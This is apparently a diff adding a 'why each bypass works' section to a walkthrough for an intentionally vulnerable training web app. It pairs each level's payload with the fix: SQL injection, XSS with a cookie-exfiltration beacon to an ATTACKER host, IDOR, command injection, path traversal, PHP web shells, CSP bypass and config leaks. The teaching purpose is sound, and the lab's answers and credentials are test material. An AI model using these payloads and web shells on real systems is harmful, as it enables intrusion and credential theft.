@@ -257,3 +257,164 @@ from it; protect sensitive paths with auth (not `robots.txt`); rotate the expose
   `bcrypt.txt` -m 3200 →football (slow — bcrypt's work factor) · `apr1_htpasswd.txt` -m 1600 →summer ·
   `sha512_shadow.txt` -m 1800 →hunter2. `mystery.txt` = 4 **unlabeled** hashes — identify each yourself
   (md5→monkey, sha256→iloveyou, ntlm→sunshine, sha1→superman).
+
+---
+# 🧠 Why each bypass works — mechanism & examples
+
+The walkthroughs above give the *payloads*. This section explains **the vulnerable code, why it's
+exploitable, and — level by level — why each bypass defeats that level's defence.** The recurring theme:
+these defences are **blacklists** (string-replace filters), and a blacklist can always be beaten by
+*reconstructing* the blocked token **after** the filter has run (nesting, encoding, a different sink).
+
+## 1. SQL injection — the query is built from strings
+**Mechanism.** Input is concatenated straight into SQL:
+```
+login :  "...WHERE username='$u' AND password=MD5(CONCAT('$p',salt))"
+search:  "...WHERE name LIKE '$q%'"        -- 3 output columns (name, category, price)
+```
+Your input breaks out of the `'...'` string and becomes *code*.
+
+**Login auth-bypass — per level** (filter `f_login`):
+```
+easy    admin'-- -                    the ' closes the username string; -- - comments out the rest
+                                        (the whole "AND password=…" check is gone) → first row = admin
+medium  admin' or '1'='1              comments (-- , --, #) are stripped → don't use one.
+                                        '...username='admin' or '1'='1'...' is always TRUE → admin row
+hard    admin' oorr '1'='1            'or' is now stripped too. The filter removes the INNER "or"
+                                        from o(or)r → the halves rejoin into "or" AFTER filtering
+expert  admin'/**/oorr/**/'1'='1      spaces stripped → /**/ is a valid SQL token-separator ("space")
+```
+*Why each step works:* the filter is a one-pass string replace. **Nesting** (`oorr`, `UNIunionON`) puts
+the keyword back together once the inner copy is deleted; **`/**/`** is whitespace to the SQL parser.
+
+**Search UNION — per level** (filter `f_sqli`):
+```
+easy    ' UNION SELECT username,password,role FROM users-- -
+medium  ' UNIunionON SELselectECT …          'union'/'select' stripped ONCE → nest them
+hard    '/**/UNIunionON/**/SEL…/**/…#         spaces also stripped → /**/ ; close with #
+expert  ' OR (SELECT SUBSTRING(v,1,1) …)='F'  rows are SUPPRESSED → UNION shows nothing, go BLIND:
+                                                ask yes/no per character (boolean/time), or use sqlmap
+```
+**Fix:** parameterised queries / prepared statements — data never becomes code, so no filter is needed.
+
+## 2 & 3. Reflected / Stored XSS — output is not encoded
+**Mechanism.** Your input is written into the HTML response verbatim (reflected = the search echo;
+stored = the guestbook **body** — the *author* field is escaped, so the payload goes in the message).
+The browser can't tell your injected markup from the app's → it executes.
+
+**Per level** (filter `f_xss`) — each level blocks the *previous* sink, so you switch to another one that
+also auto-executes:
+```
+easy    <script>alert(document.cookie)</script>
+medium  <img src=x onerror=alert(document.cookie)>      '<script' is stripped → use an event handler
+hard    <svg onload=alert(document.cookie)>             'onerror' stripped → a different handler
+expert  <svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>   'onload' stripped too
+```
+*Why it keeps working:* there are **dozens** of tags/attributes that run JS (`onerror`, `onload`,
+`onbegin`, `onfocus`, `onpointerover`, …). A blacklist can never name them all — that's why the fix is
+**output-encoding**, not banning strings.
+
+**What XSS actually gets you (the "how do I get info from it" part).** XSS runs JS **as the victim**, so
+you read their session/DOM and **exfiltrate** it:
+```
+<script>new Image().src='http://ATTACKER:9001/?c='+document.cookie</script>
+```
+It works here because the `flag` cookie has **no `HttpOnly`** (JS can read it) and you beacon it out with
+an `<img>` (see §8 for why an image, not `fetch`). Stored = fires for every visitor automatically;
+reflected = needs the victim to open your crafted link.
+**Fix:** `htmlspecialchars()` on output (context-aware encoding) + `HttpOnly` cookies.
+
+## 4. IDOR — a reference with no authorisation check
+**Mechanism.** The record is selected by an identifier taken **from the request**, and the server never
+checks *whether the current user is allowed to see that record*. So you just name someone else's object.
+```
+easy    profile.php?id=1
+medium  profile.php?id=MQ==                      id is base64 → decode/encode (MQ== = "1")
+hard    profile.php?id=c4ca4238a0b923820dcc509a6f75849b   id is md5("1") → md5 of small ints is guessable
+expert  (?id ignored) set cookie uid=1           the trusted reference moved to a cookie you control
+```
+*Why each works:* every level only **obfuscates the reference** (base64, md5, cookie) — none of them is a
+**permission**. Obfuscation ≠ access control; the reference is always forgeable.
+**Fix:** server-side authorisation — "does *this session* own *this object*?" — not a guessable id.
+
+## 5. Command injection — input reaches a shell
+**Mechanism.** `shell_exec("ping -c 1 ".$host)` — your input is part of a shell command line, so shell
+metacharacters start a **second** command.
+**Per level** (filter `f_cmd`) — each level removes one way to chain, the shell offers another:
+```
+easy    127.0.0.1; cat private/cmdi_flag.txt           ; = command separator
+medium  127.0.0.1 | cat private/cmdi_flag.b64          ; and & stripped → pipe |
+hard    127.0.0.1$(cat${IFS}private/cmdi_flag.sha256)  ; & | ` and SPACES stripped →
+                                                          $(...) substitution; ${IFS} = the shell's
+                                                          whitespace separator, used in place of a space
+expert  …> uploads/pwn.txt  then read it               output isn't returned (blind) → write to a file
+                                                          you can fetch (or DNS/time exfil)
+```
+*Why `${IFS}`:* `IFS` (Internal Field Separator) expands to whitespace, so the command still parses when
+literal spaces are banned. *Why blind exfil:* if you can't see stdout, redirect it somewhere readable.
+**Fix:** never build a shell string from input — pass an **argument array** (`exec`-style) or
+`escapeshellarg`, or use a native API with no shell.
+
+## 6. LFI / path traversal — a user string becomes a file path
+**Mechanism.** `include __DIR__."/pages/".$page` → `../` climbs out of `pages/`.
+**Per level** (filter `f_lfi`):
+```
+easy    ../../lfi_secret/flag.txt                        raw traversal
+medium  ....//....//lfi_secret/flag.txt                  '../' stripped ONCE → "....//" collapses to
+                                                            "../" after the single pass
+hard    php://filter/convert.base64-encode/resource=db.php   '../' stripped RECURSIVELY ("....//" dies) →
+                                                            you can't traverse; a php:// wrapper reads a
+                                                            file in place. base64 because a .php file
+                                                            would otherwise EXECUTE — you want its SOURCE
+expert  php://filter/read=string.rot13/resource=db.php   'base64' now blocked → a different converter
+```
+*How you'd know `db.php` exists:* first base64-read a page you're **sure** is there (`resource=home.php`
+or `resource=index.php`) and read its `require/include` lines — they name the other files. Or fuzz
+`db.php`/`config.php`.
+**Fix:** don't build include paths from input; allow-list page names; `realpath()` + check it stays under
+`pages/`; disable stream wrappers you don't need.
+
+## 7. Insecure upload — the server runs what you upload
+**Mechanism.** `move_uploaded_file` keeps your filename, does no content/extension check, and `uploads/`
+is **servable + PHP-executable** → upload `sh.php` and request it.
+**Per level** (content filter `upload_reject`) — the blacklist bans one function name, you use another:
+```
+easy    <?php system($_GET['c']); ?>
+medium  <?php passthru($_GET['c']); ?>              'system' blocked → passthru
+hard    <?php echo `{$_GET['c']}`; ?>               exec-family blocked → backticks
+expert  <?php $f='sy'.'stem'; $f($_GET['c']); ?>    backticks blocked → build the name at runtime
+                                                      (the filter matches literal substrings; 'sy'.'stem'
+                                                      isn't the literal string "system" in the source)
+```
+**Fix:** allow-list by real content type/extension, store uploads **outside** the webroot (or on a host
+that never executes them), randomise names.
+
+## 8. Weak CSP + cookie theft — a CSP that doesn't actually protect
+**Mechanism.** A CSP *is* sent, but it's permissive, and it's chained with the stored XSS:
+```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; img-src *
+```
+- `script-src 'unsafe-inline'` → your injected inline `<script>`/handler is **allowed to run**.
+- cookie set **without `HttpOnly`** → JS can read `document.cookie` (there's something worth stealing).
+- **Why an `<img>` beacon, not `fetch()`:** `img-src *` allows loading an image from *any* host (your
+  exfil channel), but there's no `connect-src`, so it **falls back to `default-src 'self'`** → `fetch`/XHR
+  to an external host is **blocked**. Reading the CSP tells you which channel survives it.
+**Fix (any one breaks the chain):** drop `'unsafe-inline'` (nonce/hash), set `connect-src`/tighten
+`img-src`, and set the cookie `HttpOnly; Secure; SameSite=Strict` — `HttpOnly` alone defeats this even
+with the weak CSP.
+
+## 9. Information disclosure — a backup served as source
+**Mechanism.** `config.php` is executed by PHP (you never see its source), but a left-behind
+**`config.php.bak`** has no PHP handler, so the server returns it **verbatim** → the admin password and an
+API key leak. `robots.txt` merely *listed* the paths — it is **not** access control (it's a map for
+attackers). Per level the same secret is just encoded harder (plaintext → base64 → unsalted → salted),
+which changes recovery *cost*, not *reachability*.
+*Browser gotcha:* `config.php.bak` looks **blank** in a browser (it hides `<?php … ?>` as an unknown tag)
+— use **View Source (Ctrl+U)** or `curl`.
+**Fix:** keep configs outside the webroot; delete `*.bak`/`*.old`/`*~`/`.git/`; protect paths with auth,
+not `robots.txt`; rotate any leaked secret.
+
+## 10. Weak / default credentials
+**Mechanism.** Real accounts use guessable passwords (`admin:S3ntinel!Admin`, `alice:password123`, …),
+so an online guess / Hydra run (or the config leak in §9) gets you in — no "exploit" required.
+**Fix:** strong password policy, rate-limiting/lockout, MFA; never ship default or reused credentials.
